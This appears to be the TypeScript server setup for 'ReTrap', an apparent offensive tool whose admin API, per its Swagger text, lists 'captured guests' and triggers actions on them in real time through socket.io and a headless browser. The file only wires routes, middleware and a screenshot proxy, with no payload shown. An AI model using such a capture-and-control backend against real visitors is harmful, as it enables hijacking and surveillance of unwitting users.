import * as Path from 'path'
import * as Express from 'express'
import * as Http from 'http'
import * as Socket from 'socket.io'
import * as cors from 'cors'
import * as proxy from 'html2canvas-proxy'
import * as swaggerJsDoc from 'swagger-jsdoc'
import * as swaggerUi from 'swagger-ui-express'

import GuestRoutes from './routes/guest'
import APIRoutes from './routes/api'
import Sockets from './sockets'
import { storeAndLookUpGuests } from './middleware'


export const app = Express()
export const server = Http.createServer(app)
export const io = Socket(server)
export const setupAppAndIO = async (browser:any, cacheDir:string = './cache') => {
    app.use(cors({origin: true}))
    app.use(Express.urlencoded())
    app.use(Express.json())
    app.use(storeAndLookUpGuests)
    app.use('/fe', Express.static(Path.resolve(__dirname, '../frontend'), {index: false}))
    app.use(Express.static(cacheDir, {index: false}))
    app.use((req, res, next) => {
        res.locals.browser = browser
        res.locals.io = io
        return next()
    })
    app.use('/api-doc', swaggerUi.serve, swaggerUi.setup(swaggerJsDoc({
        definition: {
            info: {
                title: 'ReTrap Admin API',
                description: 'Hosts verity of endpoints to list the captured guests and trigger specific actions through realtime hooks.',
                version: '1.0.0',
            },
            basePath: '/api',
        },
        apis: [Path.join(__dirname, 'routes/api.js')],
    }), {customCssUrl: 'https://cdn.jsdelivr.net/npm/swagger-ui-themes@3.0.1/themes/3.x/theme-material.css'}))
    app.use('/proxy', proxy())
    app.use('/api', APIRoutes)
    app.use('/', GuestRoutes)
    io.on('connection', Sockets)
}
